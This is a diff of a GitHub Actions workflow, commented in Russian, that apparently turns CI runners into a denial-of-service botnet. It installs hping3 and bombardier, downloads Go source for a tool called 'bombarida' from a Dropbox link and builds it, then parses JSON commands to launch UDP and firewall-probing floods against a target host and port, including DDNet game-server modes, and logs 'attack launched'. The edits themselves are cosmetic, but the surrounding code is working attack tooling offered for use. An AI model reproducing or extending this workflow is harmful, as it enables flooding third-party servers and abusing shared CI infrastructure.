@@ -35,12 +35,14 @@ jobs:
         run: |
           sudo apt-get update -qq && sudo apt-get install -y hping3 curl jq --no-install-recommends
           
+          # Bombardier
           if [ ! -f /usr/local/bin/bombardier ]; then
             wget -q https://github.com/codesenberg/bombardier/releases/download/v1.2.6/bombardier-linux-amd64 -O bombardier-linux-amd64
             chmod +x bombardier-linux-amd64
             sudo mv bombardier-linux-amd64 /usr/local/bin/bombardier
           fi
 
+          # Bombarida
           if [ ! -f ./bombarida ]; then
             wget -q -O bombarida.go "https://www.dropbox.com/scl/fi/zss6t38cy6wdztch3p5sj/bombarida_firewall_direct-1.go?rlkey=sz2tagt1enucywsrj6d7ei19k&st=8pzgzqbz&dl=1"
             go build -o bombarida bombarida.go
@@ -76,6 +78,7 @@ jobs:
             RATE=$(echo "$JSON" | jq -r '.rate // "0"')
             OPEN_LOOP=$(echo "$JSON" | jq -r '.open_loop // "false"')
 
+            # Firewall parameters
             FW_MAX_PPS=$(echo "$JSON" | jq -r '.fw_max_pps // "5000"')
             FW_START_PPS=$(echo "$JSON" | jq -r '.fw_start_pps // "50"')
             FW_STEP_UP=$(echo "$JSON" | jq -r '.fw_step_up // "150"')
@@ -117,7 +120,7 @@ jobs:
                     "udp-ddnet-vanilla") DDNET_FLAGS="$DDNET_FLAGS -ddnet-info-kind vanilla" ;;
                     "udp-ddnet-extended") DDNET_FLAGS="$DDNET_FLAGS -ddnet-info-kind extended" ;;
                     "udp-ddnet-legacy64") DDNET_FLAGS="$DDNET_FLAGS -ddnet-info-kind legacy64" ;;
-                    "udp-ddnet-mixed")  DDNET_FLAGS="$DDNET_FLAGS -ddnet-info-kind mixed" ;;
+                    "udp-ddnet-mixed") DDNET_FLAGS="$DDNET_FLAGS -ddnet-info-kind mixed" ;;
                   esac
                   [ "$OPEN_LOOP" = "true" ] && DDNET_FLAGS="$DDNET_FLAGS -open-loop"
                   ./bombarida -mode client -addr "${TARGET}:${PORT}" -c "$CONNECTIONS" -n 0 -d "$DURATION" -r "$RATE" $DDNET_FLAGS &
@@ -128,7 +131,7 @@ jobs:
                   ./bombarida -mode client -addr "${TARGET}:${PORT}" $FW_FLAGS &
                   ;;
                 *)
-                  echo "[-] Неизвестный метод"
+                  echo "[-] [$RUNNER_ID] Неизвестный метод: $METHOD"
                   sleep 5
                   continue
                   ;;
@@ -139,7 +142,7 @@ jobs:
               echo "[+] [$RUNNER_ID] Атака запущена (PID: $CURRENT_PID)"
             fi
 
-            # === Логирование (только runner1) ===
+            # Логирование (только runner1)
             if [ "$RUNNER_ID" = "runner1" ] && [ $CURRENT_PID -ne 0 ]; then
               LOG_DATA='{
   "runner": "'$RUNNER_ID'",
